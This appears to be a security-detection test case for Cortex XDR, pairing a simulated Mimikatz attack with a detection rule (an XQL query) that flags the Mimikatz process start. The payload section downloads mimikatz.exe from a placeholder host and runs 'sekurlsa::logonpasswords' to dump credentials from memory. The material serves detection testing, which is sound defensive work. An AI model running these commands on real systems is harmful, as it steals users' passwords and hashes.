identity.name: Mimikatz Command-Line Execution with Credential Dumping
identity.summary: An attacker executes Mimikatz with specific command-line arguments to extract credentials from memory. Cortex should detect the process start and suspicious command-line parameters.

payload.code:
cd C:\Windows\Temp
wget https://example.com/mimikatz.exe -OutFile mimikatz.exe
stub mimikatz.exe
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

biocs.name: Mimikatz Credential Dumping Process
biocs.description: Detection of Mimikatz process started with credential dumping arguments
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'mimikatz.exe'
| filter action_file_path contains 'sekurlsa::logonpasswords'
